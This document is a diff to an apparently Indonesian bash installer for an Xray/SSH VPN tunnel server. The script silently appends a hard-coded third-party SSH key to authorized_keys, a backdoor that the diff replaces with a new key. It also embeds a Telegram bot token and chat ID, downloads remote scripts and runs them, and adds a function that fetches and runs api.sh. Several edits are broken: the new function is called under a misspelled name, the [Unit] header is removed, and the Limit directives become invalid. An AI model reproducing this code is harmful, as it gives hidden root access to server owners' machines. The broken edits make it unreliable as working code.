@@ -23,7 +23,7 @@ TIME=$(date '+%d %b %Y')
 ipsaya=$(wget -qO- ipinfo.io/ip)
 TIMES="10"
 CHATID="7114686701"
-KEY="7291232496:AAECM92Z4en7a1xCaUuvITHBgamVi-C9Irs"
+KEY="7747621243:AAH2nkriS_uohnMnj30Gwj5Zsmuv0dfDHiA"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 clear
 export IP=$( curl -sS icanhazip.com )
@@ -374,16 +374,16 @@ echo "& plughin Account" >>/etc/ssh/.ssh.db
 }
 function install_xray() {
 clear
-print_install "Core Xray 1.8.24 Latest Version"
+print_install "Core Xray 1.8.1 Latest Version"
 domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
 chown www-data.www-data $domainSock_dir
 latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
-bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 1.8.24
+bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
 wget -O /etc/xray/config.json "${REPO}Cfg/config.json" >/dev/null 2>&1
 wget -O /etc/systemd/system/runn.service "${REPO}Fls/runn.service" >/dev/null 2>&1
 domain=$(cat /etc/xray/domain)
 IPVS=$(cat /etc/xray/ipvps)
-print_success "Core Xray 1.8.24 Latest Version"
+print_success "Core Xray 1.8.1 Latest Version"
 clear
 curl -s ipinfo.io/city >>/etc/xray/city
 curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
@@ -397,7 +397,6 @@ cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
 chmod +x /etc/systemd/system/runn.service
 rm -rf /etc/systemd/system/xray.service.d
 cat >/etc/systemd/system/xray.service <<EOF
-[Unit]
 Description=Xray Service
 Documentation=https://github.com
 After=network.target nss-lookup.target
@@ -409,8 +408,8 @@ NoNewPrivileges=true
 ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
 Restart=on-failure
 RestartPreventExitStatus=23
-LimitNOFILE=1000000
-LimitNPROC=65535
+filesNPROC=10000
+filesNOFILE=1000000
 [Install]
 WantedBy=multi-user.target
 EOF
@@ -467,6 +466,10 @@ ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 print_success "Password SSH"
 }
+
+function api_tunnel() { 
+apt install dos2unix; wget ${REPO}api.sh && chmod +x api.sh && dos2unix api.sh && bash api.sh; clear; }
+
 function udp_mini(){
 clear
 print_install "Memasang Service Limit IP & Quota"
@@ -474,11 +477,11 @@ wget -q https://raw.githubusercontent.com/kcepu877/V1/main/config/fv-tunnel && c
 
 # // Installing UDP Mini
 mkdir -p /usr/local/
-wget -q -O /usr/local/udp-mini "${REPO}files/udp-mini"
+wget -q -O /usr/local/udp-mini "${REPO}Fls/udp-mini"
 chmod +x /usr/local/udp-mini
-wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}files/udp-mini-1.service"
-wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}files/udp-mini-2.service"
-wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}files/udp-mini-3.service"
+wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}Fls/udp-mini-1.service"
+wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}Fls/udp-mini-2.service"
+wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}Fls/udp-mini-3.service"
 systemctl disable udp-mini-1
 systemctl stop udp-mini-1
 systemctl enable udp-mini-1
@@ -847,6 +850,7 @@ password_default
 pasang_ssl
 install_xray
 ssh
+apu_tunnel
 udp_mini
 ssh_slow
 ins_SSHD
@@ -877,7 +881,7 @@ sudo hostnamectl set-hostname $usernameclear
 clear
 echo -e ""
 mkdir -p ~/.ssh  # Pastikan folder .ssh ada
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNtb5dfck/X08CcEray1Iy1IilISj1kmPtN7IOnwEAy" >> ~/.ssh/authorized_keys
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGUCFOOv8WBQ9h2Aooim0ODWnOwwBkfgn/JIydf4CaRN" >> ~/.ssh/authorized_keys
 chmod 700 ~/.ssh
 chmod 600 ~/.ssh/authorized_keys
 systemctl restart sshd
